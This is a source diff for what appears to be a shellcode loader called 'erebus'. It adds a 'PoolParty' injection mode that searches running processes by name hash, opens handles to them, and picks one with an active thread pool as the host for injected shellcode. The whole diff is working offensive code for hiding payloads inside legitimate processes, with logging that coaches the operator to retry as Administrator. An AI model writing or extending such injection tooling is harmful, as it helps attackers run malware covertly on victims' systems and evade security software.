@@ -5,8 +5,8 @@ VOID entry(void)
 {
 	erebus::config.injection_method = erebus::GetInjectionMethod();
 
-	HANDLE process_handle = NULL;
-	HANDLE thread_handle = NULL;
+	HANDLE process_handle = INVALID_HANDLE_VALUE;
+	HANDLE thread_handle = INVALID_HANDLE_VALUE;
 	SIZE_T shellcode_size = sizeof(shellcode);
 
 	if (shellcode_size == 0 || (sizeof(shellcode) > 0 && shellcode[0] == 0x00))
@@ -32,6 +32,50 @@ VOID entry(void)
 	process_handle = NtCurrentProcess();
 	thread_handle = NtCurrentThread();
 	LOG_SUCCESS("Using self-injection (current process)");
+#elif CONFIG_INJECTION_MODE == 3
+	// PoolParty injection: inject into existing process with active thread pool
+	// Find target process by name hash, checking for thread pool existence
+	constexpr ULONG targets[] = {
+		CONFIG_TARGET_PROCESS
+	};
+	const SIZE_T targetCount = sizeof(targets) / sizeof(targets[0]);
+
+	DWORD pid = 0;
+	BOOL foundThreadPool = FALSE;
+	
+	// Iterate through all matching processes to find one with an active thread pool
+	for (SIZE_T attempt = 0; attempt < targetCount * 3 && !foundThreadPool; attempt++) {
+		// Get next matching process from hash list (skips already-tried PIDs internally)
+		pid = erebus::ProcessGetPidFromHashedListEx((DWORD*)targets, targetCount, attempt);
+		if (pid == 0) {
+			LOG_INFO("No more matching processes found in hash list");
+			break;
+		}
+		
+		LOG_INFO("Checking process (PID: %lu) for thread pool...", pid);
+		
+		process_handle = erebus::GetProcessHandle(pid);
+		if (!process_handle || process_handle == INVALID_HANDLE_VALUE) {
+			LOG_INFO("Could not open process (PID: %lu), trying next...", pid);
+			continue;
+		}
+		
+		// Check if process has an active thread pool (IoCompletion handle)
+		if (erebus::ProcessHasThreadPool(process_handle)) {
+			LOG_SUCCESS("Found target process with thread pool (PID: %lu)", pid);
+			foundThreadPool = TRUE;
+		} else {
+			LOG_INFO("Process (PID: %lu) has no thread pool, trying next...", pid);
+			CloseHandle(process_handle);
+			process_handle = INVALID_HANDLE_VALUE;
+		}
+	}
+	
+	if (!foundThreadPool || pid == 0) {
+		LOG_ERROR("Failed to find any target process with an active thread pool");
+		LOG_INFO("Note: Try running as Administrator or target a different process");
+		return;
+	}
 #endif
 
 	if (!process_handle || !thread_handle)
